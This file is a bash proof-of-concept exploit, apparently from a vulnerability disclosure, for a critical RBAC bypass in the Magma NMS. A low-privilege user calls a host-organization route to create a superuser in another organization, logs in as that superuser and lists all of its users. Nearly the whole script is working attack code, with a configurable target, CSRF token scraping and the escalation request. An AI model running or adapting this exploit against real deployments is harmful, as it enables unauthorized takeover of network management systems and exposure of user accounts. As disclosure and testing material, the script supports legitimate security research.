#!/bin/bash
# =============================================================================
# MAGMA-2026-001 - Host Routes RBAC Bypass (standalone, no Orc8r phases)
# =============================================================================
# A normal USER (role=0) in the Magma "host" organization creates a SUPERUSER
# (role=3) in any existing organization with one POST request.
#
# This is the NON-CHAINED proof of concept. It stops at "SUPERUSER created and
# can list users". It does not touch gRPC or the Orc8r REST API.
#
# For the full chain (RBAC -> hardcoded gRPC token -> certificate header
# spoofing), see MAGMA-2026-005 / poc/05-chain-poc.sh.
#
# AUTHORIZED TESTING ONLY.
# =============================================================================

# -----------------------------------------------------------------------------
# CONFIGURATION - change these for your target
# -----------------------------------------------------------------------------
NMS_URL="http://localhost:8081"          # NMS base URL
HOST_HOST="host.localhost:8081"          # Host header for the host org
TARGET_HOST="testorg.localhost:8081"     # Host header for the target org
TARGET_ORG="testorg"                     # target org (must already exist)
USER_EMAIL="normal@test.com"             # existing role=0 user in HOST org
USER_PASS="password12345"                # password of that user

# -----------------------------------------------------------------------------
# No configuration below this line
# -----------------------------------------------------------------------------
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
info() { echo -e "${YELLOW}[*]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1"; }

echo "=============================================================="
echo " MAGMA-2026-001 - Host Routes RBAC Bypass"
echo " CVSS 3.1: 9.9 CRITICAL | CVSS 4.0: 9.4 CRITICAL"
echo "=============================================================="
echo "  User:   $USER_EMAIL (role=0)"
echo "  Target: $NMS_URL ($TARGET_ORG)"
echo ""

# --- Step 1: login as the low-privilege user -------------------------------
info "Step 1: login as $USER_EMAIL"
COOKIE="/tmp/magma_rbac_jar.txt"; rm -f "$COOKIE"
P=$(curl -sf -c "$COOKIE" -H "Host: $HOST_HOST" "$NMS_URL/user/login" 2>/dev/null)
CSRF=$(echo "$P" | grep -oP '"csrfToken":"\K[^"]+')
[ -z "$CSRF" ] && { err "NMS not reachable at $NMS_URL"; exit 1; }
curl -sf -L -c "$COOKIE" -b "$COOKIE" -X POST "$NMS_URL/user/login" \
  -H "Content-Type: application/x-www-form-urlencoded" -H "Host: $HOST_HOST" \
  -H "X-CSRF-Token: $CSRF" \
  -d "email=$(echo "$USER_EMAIL" | sed 's/@/%40/g')&password=$USER_PASS" \
  -o /dev/null 2>/dev/null
ok "Logged in as $USER_EMAIL"

# --- Step 2: confirm the user is genuinely low privilege -------------------
info "Step 2: confirm USER cannot list users"
P2=$(curl -sf -c "$COOKIE" -b "$COOKIE" -H "Host: $HOST_HOST" "$NMS_URL/nms/" 2>/dev/null)
CSRF2=$(echo "$P2" | grep -oP '"csrfToken":"\K[^"]+' | head -1)
HTTP=$(curl -s -o /dev/null -w "%{http_code}" -c "$COOKIE" -b "$COOKIE" \
  -H "Host: $HOST_HOST" -H "X-CSRF-Token: $CSRF2" "$NMS_URL/user/async/" 2>/dev/null)
ok "User list blocked -> HTTP $HTTP (expected 302/403)"

# --- Step 3: exploit - create a SUPERUSER ----------------------------------
info "Step 3: creating SUPERUSER in $TARGET_ORG"
ESC_EMAIL="esc-$(date +%s)@test.com"
ESC_PASS="$(openssl rand -base64 12 | tr '+/' 'xX')!"
RESP=$(curl -s -c "$COOKIE" -b "$COOKIE" -X POST \
  "$NMS_URL/host/organization/async/$TARGET_ORG/add_user" \
  -H "Content-Type: application/json" -H "Host: $HOST_HOST" \
  -H "X-CSRF-Token: $CSRF2" \
  -d "{\"email\":\"$ESC_EMAIL\",\"password\":\"$ESC_PASS\",\"role\":3,\"networkIDs\":[\"*\"]}" \
  -w '\n%{http_code}' 2>/dev/null)
HTTP=$(echo "$RESP" | tail -1)
BODY=$(echo "$RESP" | sed '$d')
ROLE=$(echo "$BODY" | python3 -c "import json,sys; print(json.load(sys.stdin).get('user',{}).get('role','FAIL'))" 2>/dev/null)
if [ "$ROLE" = "3" ]; then
  ok "SUPERUSER created: $ESC_EMAIL / $ESC_PASS"
else
  err "Failed (HTTP $HTTP): $BODY"
  exit 1
fi

# --- Step 4: prove the new account is SUPERUSER ---------------------------
info "Step 4: login as the new SUPERUSER"
rm -f "$COOKIE"
P=$(curl -sf -c "$COOKIE" -H "Host: $TARGET_HOST" "$NMS_URL/user/login" 2>/dev/null)
CSRF=$(echo "$P" | grep -oP '"csrfToken":"\K[^"]+')
curl -sf -L -c "$COOKIE" -b "$COOKIE" -X POST "$NMS_URL/user/login" \
  -H "Content-Type: application/x-www-form-urlencoded" -H "Host: $TARGET_HOST" \
  -H "X-CSRF-Token: $CSRF" \
  -d "email=$(echo "$ESC_EMAIL" | sed 's/@/%40/g')&password=$ESC_PASS" \
  -o /dev/null 2>/dev/null
ok "Logged in as SUPERUSER"

# --- Step 5: list all users in the target org -----------------------------
info "Step 5: SUPERUSER lists all users in $TARGET_ORG"
P4=$(curl -sf -c "$COOKIE" -b "$COOKIE" -H "Host: $TARGET_HOST" "$NMS_URL/nms/" 2>/dev/null)
CSRF4=$(echo "$P4" | grep -oP '"csrfToken":"\K[^"]+' | head -1)
curl -sf -c "$COOKIE" -b "$COOKIE" -H "Host: $TARGET_HOST" -H "X-CSRF-Token: $CSRF4" \
  "$NMS_URL/user/async/" 2>/dev/null | python3 -c "
import json,sys
data=json.load(sys.stdin); users=data.get('users',[])
print(f'  Total: {len(users)} users')
for u in users:
    n={0:'USER',1:'READ_ONLY',2:'NETWORK_ADMIN',3:'SUPERUSER'}.get(u.get('role'),'?')
    print('    %-32s %s' % (u.get('email',''), n))
" 2>/dev/null

rm -f "$COOKIE"
echo ""
echo "=============================================================="
echo " RESULT: $USER_EMAIL (role=0) -> $ESC_EMAIL (role=3)"
echo " Chain report: MAGMA-2026-005 / poc/05-chain-poc.sh"
echo "=============================================================="
